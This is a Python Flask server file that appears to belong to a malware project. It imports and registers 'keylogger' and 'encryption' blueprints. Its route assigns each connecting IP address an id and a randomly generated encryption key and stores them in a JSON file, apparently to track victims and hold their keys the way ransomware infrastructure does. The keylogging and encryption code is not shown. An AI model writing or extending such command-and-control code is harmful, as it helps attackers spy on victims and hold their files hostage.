from flask import Flask, request, Blueprint, Response
import sys
from keylogger.keylog import keylog
from encryption.encrypt import encrypt
import json
import string
import random
from typing import Dict
import os
app: Flask = Flask(__name__)
app.register_blueprint(keylog)
app.register_blueprint(encrypt)


@app.route('/id_request')
def get_id() -> Dict[str, int]:
    """
    A route to fetch the id of a given ip address

    Return:
    a dictionary with a key of id, and the ip's corresonding id number
    """
    data_file: str = "data/id.json"
    data: Dict[str, Dict[str, any]] = {}
    if(os.path.exists(data_file)):
        with open(data_file, "r") as fp:
            data = json.load(fp)

    ip: str = request.remote_addr
    id_number: int = 0

    # If the ip already exists, return the resulting value.
    if ip in data.keys():
        id_number = data[ip]['id']
    else:

        # New access, generate an id and random encryption key
        if data:
            id_number = max(data.values(), key=lambda x: x['id'])['id'] + 1

        key: str = ''.join([random.choice(string.ascii_letters)
                            for i in range(16)])

        data[ip] = {'id': id_number, 'key': key}
        with open(data_file, "w+") as fp:
            json.dump(data, fp)

    return {'id': id_number}


if __name__ == "__main__":
    app.run()
